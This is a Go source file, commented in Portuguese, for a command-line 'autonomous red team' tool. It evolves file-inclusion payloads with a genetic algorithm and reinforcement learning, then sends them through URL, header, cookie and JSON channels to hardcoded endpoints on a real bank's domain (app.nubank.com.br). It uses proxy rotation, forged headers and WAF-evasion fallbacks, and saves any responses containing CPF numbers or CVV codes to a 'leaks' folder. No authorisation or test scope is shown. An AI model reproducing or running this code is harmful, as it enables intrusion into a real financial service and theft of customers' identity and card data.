// 📡 main.go — Red Team Autônomo Avançado (Versão Corrigida)
// GA + RL + ML Feedback | Multi-Channel Injection | SVG & CSV Export | CLI Cobra
package main

import (
	"bufio"
	"crypto/rand"
	"encoding/binary"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"time"

	mathrand "math/rand"

	"github.com/spf13/cobra"
	"github.com/schollz/progressbar/v3"
	"lfitessla/analyzer"
	"lfitessla/headers"
	"lfitessla/injector"
	"lfitessla/mutador"
	"lfitessla/proxy"
	"lfitessla/strategies"
)

// RLState representa um estado para tabela de recompensa
type RLState struct {
	Payload string `json:"payload"`
	WAF     string `json:"waf"`
	Canal   string `json:"canal"`
}

// EvolutionStats coleta métricas por geração
type EvolutionStats struct {
	Generation   int     `json:"generation"`
	MaxFitness   int     `json:"max_fitness"`
	AvgFitness   float64 `json:"avg_fitness"`
	EntropyDelta float64 `json:"entropy_delta"`
	BestPayload  string  `json:"best_payload"`
}

// Alvo representa endpoint alvo de LFI/RFI/etc.
type Alvo struct {
	URL    string
	Method string
	Body   string // para POSTs
}

var (
	// CLI flags
	cfgThreads   int
	cfgGens      int
	cfgPopSize   int
	cfgSaveSVG   bool
	cfgSaveCSV   bool
	cfgChannels  []string
	cfgOutputDir string
	cfgNoBrowser bool
	cfgDashboard bool

	// tabelas de RL
	rlTable = make(map[RLState]float64)
	statsAll = struct {
		sync.Mutex
		Data map[string][]EvolutionStats
	}{Data: make(map[string][]EvolutionStats)}

	// regex de detecção de vazamento
	regexSensivel = []*regexp.Regexp{
		regexp.MustCompile(`(?i)cpf[:=]\s*\d{3}\.\d{3}\.\d{3}-\d{2}`),
		regexp.MustCompile(`(?i)cvv[:=]?\s*\d{3}`),
	}

	// alvos básicos
	alvosBase = []Alvo{
		{"https://app.nubank.com.br/beta/index.php?page=", "GET", ""},
		{"https://app.nubank.com.br/beta/index.php?file=", "GET", ""},
		{"https://app.nubank.com.br/beta/download.php?file=", "GET", ""},
		{"https://app.nubank.com.br/beta/view.php?doc=", "GET", ""},
		{"https://app.nubank.com.br/beta/template.php?path=", "GET", ""},
	}
)

func main() {
	rootCmd := &cobra.Command{
		Use:   "redbot",
		Short: "Red Team Autônomo Avançado",
		Run:   run,
	}

	// flags
	rootCmd.Flags().IntVarP(&cfgThreads, "threads", "t", 20, "concurrent threads")
	rootCmd.Flags().IntVarP(&cfgGens, "gens", "g", 8, "GA generations")
	rootCmd.Flags().IntVarP(&cfgPopSize, "pop", "p", 10, "GA population size")
	rootCmd.Flags().BoolVar(&cfgSaveSVG, "save-svg", false, "save entropy SVG for elites")
	rootCmd.Flags().BoolVar(&cfgSaveCSV, "save-csv", false, "save CSV stats per attack")
	rootCmd.Flags().StringSliceVar(&cfgChannels, "channels", []string{"url", "header", "cookie", "json"}, "injection channels: url,header,cookie,json,xml")
	rootCmd.Flags().StringVarP(&cfgOutputDir, "output", "o", "./output", "output base directory")
	rootCmd.Flags().BoolVar(&cfgNoBrowser, "no-browser", false, "no automatic dashboard browser launch")
	rootCmd.Flags().BoolVar(&cfgDashboard, "dashboard", true, "generate dashboard JSON + HTML")

	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

func run(cmd *cobra.Command, args []string) {
	// seed math/rand
	var seed int64
	_ = binary.Read(rand.Reader, binary.LittleEndian, &seed)
	mathrand.Seed(seed)

	// criar pastas
	os.MkdirAll(filepath.Join(cfgOutputDir, "vazamentos"), 0755)
	if cfgSaveSVG {
		os.MkdirAll(filepath.Join(cfgOutputDir, "svg_debug"), 0755)
	}
	if cfgSaveCSV {
		os.MkdirAll(filepath.Join(cfgOutputDir, "stats_csv"), 0755)
	}

	// carregar payloads
	payloads, err := carregarPayloads("payloads_gerados.txt")
	if err != nil {
		fmt.Println("❌ Carregar payloads:", err)
		return
	}

	// loop de ataques
	total := len(alvosBase) * len(payloads)
	bar := progressbar.NewOptions(total, progressbar.OptionSetPredictTime(false))
	sem := make(chan struct{}, cfgThreads)
	var wg sync.WaitGroup

	for _, alvo := range alvosBase {
		for _, p := range payloads {
			wg.Add(1)
			sem <- struct{}{}
			go func(a Alvo, payload string) {
				defer wg.Done()
				executarAtaque(a, payload)
				<-sem
				bar.Add(1)
			}(alvo, p)
		}
	}
	wg.Wait()
	fmt.Println("✅ Ataques finalizados.")
	exportResults()

	if cfgDashboard && !cfgNoBrowser {
		openBrowser(filepath.Join(cfgOutputDir, "dashboard.html"))
	}
}

func carregarPayloads(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var list []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "---") {
			list = append(list, line)
		}
	}
	return list, scanner.Err()
}

func executarAtaque(alvo Alvo, basePayload string) {
	attackID := fmt.Sprintf("%s|%s", alvo.URL, basePayload)

	// 1) Inicial com entropia-target
	initPop := mutador.MutarParaEntropiaTarget(basePayload, 6.5)
	if len(initPop) == 0 {
		initPop = mutador.MutarPayload(basePayload)
	}

	// 2) GA loop
	finalPop, stats := runGAWithStats(initPop, cfgGens, cfgPopSize)

	// Armazenar stats
	statsAll.Lock()
	statsAll.Data[attackID] = stats
	statsAll.Unlock()

	// opcional CSV
	if cfgSaveCSV {
		saveCSVStats(attackID, stats)
	}

	// 3) Multi-Channel Injection
	for _, elite := range finalPop {
		for _, canal := range cfgChannels {
			mutantes := mutador.MutarPorCanal(elite.Payload, canal)
			if len(mutantes) == 0 {
				mutantes = []string{elite.Payload}
			}
			for _, m := range mutantes {
				req, err := strategies.BuildInjectionRequest(canal, alvo.Method, alvo.URL, m, alvo.Body)
				if err != nil {
					continue
				}
				for k, v := range headers.GerarHeadersRealistas() {
					req.Header[k] = v
				}
				proxySel, client, err := strategies.EscolherTransport("", "")
				if err != nil {
					continue
				}
				start := time.Now()
				resp, err2 := client.Do(req)
				latency := time.Since(start).Seconds()
				if err2 != nil {
					proxy.MarcarFalha(proxySel)
					continue
				}
				bodyBytes, _ := io.ReadAll(resp.Body)
				resp.Body.Close()
				body := string(bodyBytes)

				waf := analyzer.DetectarWAF(resp.StatusCode, resp.Header, body)
				key := RLState{Payload: m, WAF: waf, Canal: canal}
				rlTable[key] += 0.1

				if resp.StatusCode == http.StatusForbidden {
					fb := injector.TentarFallback(alvo.URL, m)
					if fb.Success {
						salvarResposta(m, alvo.URL, fb.Body)
						rlTable[key] += fb.Reward
						return
					}
				}

				if containsLeak(body) {
					salvarResposta(m, alvo.URL, body)
					reward := analyzer.ScoreResponse(body) - latency*0.1
					rlTable[key] += reward
					if cfgSaveSVG {
						svg := mutador.EntropyVisualDebug(mutador.GenePayload{Payload: m})
						safe := safeFilename(m)
						os.WriteFile(filepath.Join(cfgOutputDir, "svg_debug", safe+".svg"), []byte(svg), 0644)
					}
					return
				}
			}
		}
	}

	// 4) Fallback mutações simples
	for _, m := range mutador.MutarPayload(basePayload) {
		req, _ := http.NewRequest(alvo.Method, alvo.URL+m, strings.NewReader(alvo.Body))
		for k, v := range headers.GerarHeadersRealistas() {
			req.Header[k] = v
		}
		proxySel, client, err := strategies.EscolherTransport("", "")
		if err != nil {
			continue
		}
		resp, err2 := client.Do(req)
		if err2 != nil {
			proxy.MarcarFalha(proxySel)
			continue
		}
		bodyBytes, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		body := string(bodyBytes)
		if containsLeak(body) {
			salvarResposta(m, alvo.URL, body)
			key := RLState{Payload: m, WAF: "", Canal: "fallback"}
			rlTable[key] += 0.5
			return
		}
	}
}

func runGAWithStats(initial []string, generations, popSize int) ([]mutador.GenePayload, []EvolutionStats) {
	pop := make([]mutador.GenePayload, len(initial))
	for i, p := range initial {
		pop[i] = mutador.GenePayload{Payload: p}
		pop[i].Fitness = mutador.AvaliarFitness(pop[i])
		pop[i].Profile = mutador.AnalyzeProfile(pop[i])
		pop[i].Mutations = []string{"init"}
	}

	var stats []EvolutionStats
	prevEnt := 0.0

	for gen := 0; gen < generations; gen++ {
		var offs []mutador.GenePayload
		for i := 0; i < popSize; i++ {
			a := pop[mathrand.Intn(len(pop))]
			b := pop[mathrand.Intn(len(pop))]
			child := mutador.Crossover(a, b)
			child.Mutations = append(child.Mutations, "crossover")
			if mathrand.Float64() < 0.5 {
				child = mutador.MutateGene(child)
				child.Mutations = append(child.Mutations, "mutate-gene")
			} else {
				child = mutador.MutateInMaxEntropyWindow(child, 16)
				child.Mutations = append(child.Mutations, "mutate-window")
			}
			if mathrand.Float64() < 0.3 {
				child = mutador.MutarEncodeEntropyAware(child)
				child.Mutations = append(child.Mutations, "encode-entropy")
			}
			child.Fitness = mutador.AvaliarFitness(child)
			child.Profile = mutador.AnalyzeProfile(child)
			offs = append(offs, child)
		}
		pop = append(pop, offs...)
		pop = mutador.BatchAnalyzeFitness(pop)
		pop = mutador.SelecionarPayloads(pop, popSize)

		// estatísticas
		maxF, sumF, sumE := pop[0].Fitness, 0, 0.0
		for _, ind := range pop {
			sumF += ind.Fitness
			sumE += ind.Profile.Entropy
			if ind.Fitness > maxF {
				maxF = ind.Fitness
			}
		}
		avgF := float64(sumF) / float64(len(pop))
		avgE := sumE / float64(len(pop))
		delta := avgE - prevEnt
		prevEnt = avgE

		stats = append(stats, EvolutionStats{
			Generation:   gen,
			MaxFitness:   maxF,
			AvgFitness:   avgF,
			EntropyDelta: delta,
			BestPayload:  pop[0].Payload,
		})
	}

	return pop, stats
}

func containsLeak(body string) bool {
	for _, re := range regexSensivel {
		if re.MatchString(body) {
			return true
		}
	}
	return false
}

func salvarResposta(payload, base, body string) {
	ts := time.Now().Format("2006-01-02_15-04-05")
	safe := safeFilename(payload)
	parts := strings.SplitN(base, "?", 2)
	name := "root"
	if len(parts) == 2 {
		name = parts[1]
	}
	fn := filepath.Join(cfgOutputDir, "vazamentos",
		fmt.Sprintf("resp_%s__%s__%s.txt", name, safe, ts))
	os.WriteFile(fn, []byte(body), 0644)
}

func safeFilename(s string) string {
	return strings.NewReplacer(
		"/", "_", "%", "_", "?", "_", "&", "_", "=", "_",
	).Replace(s)
}

func saveCSVStats(attackID string, stats []EvolutionStats) {
	file := filepath.Join(cfgOutputDir, "stats_csv", safeFilename(attackID)+".csv")
	f, err := os.Create(file)
	if err != nil {
		return
	}
	defer f.Close()
	w := csv.NewWriter(f)
	w.Write([]string{"gen", "max_fitness", "avg_fitness", "entropy_delta", "best_payload"})
	for _, s := range stats {
		w.Write([]string{
			fmt.Sprint(s.Generation),
			fmt.Sprint(s.MaxFitness),
			fmt.Sprintf("%.2f", s.AvgFitness),
			fmt.Sprintf("%.4f", s.EntropyDelta),
			s.BestPayload,
		})
	}
	w.Flush()
}

func exportResults() {
	// RL rewards
	if data, err := json.MarshalIndent(rlTable, "", "  "); err == nil {
		os.WriteFile(filepath.Join(cfgOutputDir, "rl_rewards.json"), data, 0644)
	}
	// Evolution stats
	statsAll.Lock()
	if data, err := json.MarshalIndent(statsAll.Data, "", "  "); err == nil {
		os.WriteFile(filepath.Join(cfgOutputDir, "evolution_stats.json"), data, 0644)
	}
	statsAll.Unlock()

	// Dashboard básico (HTML + Chart.js)
	if cfgDashboard {
		generateDashboard(cfgOutputDir)
	}
}

func generateDashboard(outDir string) {
	html := `
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Dashboard RedBot</title>
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
</head>
<body>
  <h1>Evolution Stats</h1>
  <canvas id="evoChart" width="800" height="400"></canvas>
  <script>
    fetch('evolution_stats.json').then(r=>r.json()).then(data=>{
      console.log(data);
      // aqui você pode popular o Chart.js
    });
  </script>
</body>
</html>`
	os.WriteFile(filepath.Join(outDir, "dashboard.html"), []byte(html), 0644)
}

// openBrowser tenta abrir o arquivo HTML no navegador padrão
func openBrowser(path string) {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd", "/c", "start", path)
	case "darwin":
		cmd = exec.Command("open", path)
	default:
		cmd = exec.Command("xdg-open", path)
	}
	_ = cmd.Start()
}